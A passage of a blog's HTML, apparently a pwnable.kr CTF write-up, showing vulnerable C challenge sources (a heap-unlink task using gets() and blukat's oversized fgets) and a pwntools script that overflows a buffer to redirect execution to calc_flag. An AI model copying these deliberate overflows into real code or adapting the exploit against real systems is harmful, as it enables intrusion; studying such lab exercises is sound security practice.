    <span class="n">OBJ</span><span class="o">*</span> <span class="n">B</span> <span class="o">=</span> <span class="p">(</span><span class="n">OBJ</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">OBJ</span><span class="p">));</span>
    <span class="n">OBJ</span><span class="o">*</span> <span class="n">C</span> <span class="o">=</span> <span class="p">(</span><span class="n">OBJ</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">OBJ</span><span class="p">));</span>

    <span class="c1">// double linked list: A &lt;-&gt; B &lt;-&gt; C
</span><span class="c1"></span>    <span class="n">A</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">B</span><span class="p">;</span>
    <span class="n">B</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">A</span><span class="p">;</span>
    <span class="n">B</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">C</span><span class="p">;</span>
    <span class="n">C</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">B</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;here is stack address leak: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">A</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;here is heap address leak: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">A</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;now that you have leaks, get shell!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="c1">// heap overflow!
</span><span class="c1"></span>    <span class="n">gets</span><span class="p">(</span><span class="n">A</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">);</span>

    <span class="c1">// exploit this unlink!
</span><span class="c1"></span>    <span class="n">unlink</span><span class="p">(</span><span class="n">B</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="blukat-todo">blukat (TODO)</h1>
<blockquote>
<p>Sometimes, pwnable is strange&hellip;
hint: if this challenge is hard, you are a skilled player.</p>
<p>ssh <a href="mailto:blukat@pwnable.kr">blukat@pwnable.kr</a> -p2222 (pw: guest)</p>
</blockquote>
<p>blukat.c</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
<span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
<span class="kt">char</span><span class="o">*</span> <span class="n">key</span> <span class="o">=</span> <span class="s">&#34;3</span><span class="se">\r</span><span class="s">G[S/%</span><span class="se">\x1c\x1d</span><span class="s">#0?</span><span class="se">\r</span><span class="s">IS</span><span class="se">\x0f\x1c\x1d\x18</span><span class="s">;,4</span><span class="se">\x1b\x00\x1b</span><span class="s">p;5</span><span class="se">\x0b\x1b\x08\x45</span><span class="s">+&#34;</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">calc_flag</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">s</span><span class="p">){</span>
        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
                <span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="p">}</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
        <span class="n">FILE</span><span class="o">*</span> <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;/home/blukat/password&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
        <span class="n">fgets</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;guess the password!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">buf</span><span class="p">)){</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;congrats! here is your flag: &#34;</span><span class="p">);</span>
                <span class="n">calc_flag</span><span class="p">(</span><span class="n">password</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span><span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;wrong guess!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[*] &#39;/tmp/blukat&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre></td></tr></table>
</div>
</div><p>开了 Canary 看起来很难的样子</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># pwnlib.gdb.context.terminal = [&#39;konsole&#39;, &#39;-e&#39;]</span>
<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./blukat&#39;</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./blukat&#39;</span><span class="p">)</span>

<span class="n">pwnlib</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s1">&#39;b fgets&#39;</span><span class="p">)</span>

<span class="n">calc_flag_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;calc_flag&#39;</span><span class="p">]</span>
<span class="n">password_addr</span>  <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span> <span class="o">+</span> <span class="mh">0x4</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">calc_flag_addr</span><span class="p">,</span> <span class="n">password_addr</span><span class="p">])</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="horcruses-todo">horcruses (TODO)</h1>
<blockquote>
<p>Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and ROP it!
author: jiwon choi</p>
<p>ssh <a href="mailto:horcruxes@pwnable.kr">horcruxes@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
    </div>

    <div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">文章作者</span>
    <span class="item-content">Aloxaf</span>
  </p>
  <p class="copyright-item">
    <span class="item-title">上次更新</span>
    <span class="item-content">
        2018-05-04
        
    </span>
  </p>
  
  <p class="copyright-item">
    <span class="item-title">许可协议</span>
    <span class="item-content"><a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a></span>
  </p>
</div>
<footer class="post-footer">
      <div class="post-tags">
          <a href="/tags/ctf/">ctf</a>
          <a href="/tags/writeup/">writeup</a>
          <a href="/tags/pwn/">pwn</a>
          </div>
      <nav class="post-nav">
        <a class="prev" href="/2018/05/improve_hexo_table/">
            <i class="iconfont icon-left"></i>
            <span class="prev-text nav-default">改进hexo/cafe主题表格显示效果</span>
            <span class="prev-text nav-mobile">上一篇</span>
          </a>
        <a class="next" href="/2017/12/gnomre-terminal-transparency/">
            <span class="next-text nav-default">解决Gnome终端无法设置透明度的问题</span>
            <span class="next-text nav-mobile">下一篇</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
  </article>
        </div>
        

  <span id="/2018/05/pwnable.kr_toddlers_bottle/" class="leancloud_visitors" data-flag-title="pwnable.kr - Toddler&#39;s Bottle 部分writeup">
		<span class="post-meta-item-text">文章阅读量 </span>
		<span class="leancloud-visitors-count">0</span>
		<p></p>
	  </span>
  <div id="vcomments"></div>
  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
  <script type="text/javascript">
    new Valine({
        el: '#vcomments' ,
        serverURLs: 'https:\/\/lcd.aloxaf.cn',
        appId: 'fSbXaElXXTznggVXiWy8NFBU-gzGzoHsz',
        appKey: 'kK3SxB14xAACgHftKrSaBRDU',
        notify:  false ,
        verify:  false ,
        avatar:'mm',
        placeholder: '妙啊，妙啊',
        visitor:  true 
    });
  </script>

  

      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="social-links">
      <a href="mailto:aloxafx@gmail.com" class="iconfont icon-email" title="email"></a>
      <a href="https://github.com/Aloxaf" class="iconfont icon-github" title="github"></a>
  <a href="https://www.aloxaf.com/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
</div>

<div class="copyright">
  <span class="power-by">
    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    主题 - 
    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
  </span>

  

  <span class="copyright-year">
    &copy; 
    2017 - 
    2020<span class="heart"><i class="iconfont icon-heart"></i></span><span>Aloxaf</span>
  </span>
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/timeago.js@3.0.2/dist/timeago.min.js" integrity="sha256-jwCP0NAdCBloaIWTWHmW4i3snUNMHUNO+jr9rYd2iOI=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/timeago.js@3.0.2/dist/timeago.locales.min.js" integrity="sha256-ZwofwC1Lf/faQCzN7nZtfijVV6hSwxjQMwXL4gn9qU8=" crossorigin="anonymous"></script>
  <script><!-- NOTE: timeago.js uses the language code format like "zh_CN" (underscore and case sensitive) -->
    var languageCode = "zh".replace(/-/g, '_').replace(/_(.*)/, function ($0, $1) {return $0.replace($1, $1.toUpperCase());});
    timeago().render(document.querySelectorAll('.timeago'), languageCode);
    timeago.cancel();  
  </script>



<script type="text/javascript" src="/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-123773630-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>







</body>
</html>
